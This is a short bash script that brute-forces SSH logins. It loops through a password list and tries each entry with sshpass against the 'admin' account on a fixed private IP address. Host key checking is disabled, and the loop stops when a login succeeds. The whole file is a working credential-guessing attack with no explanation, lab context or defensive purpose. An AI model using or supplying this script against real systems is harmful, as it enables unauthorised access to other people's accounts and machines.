#!/bin/bash
IP="192.168.1.100"
USER="admin"
PASSWORD_LIST="passwords.txt"
while read password; do
    sshpass -p "$password" ssh -o StrictHostKeyChecking=no $USER@$IP echo "Login successful!" && break
done < $PASSWORD_LIST
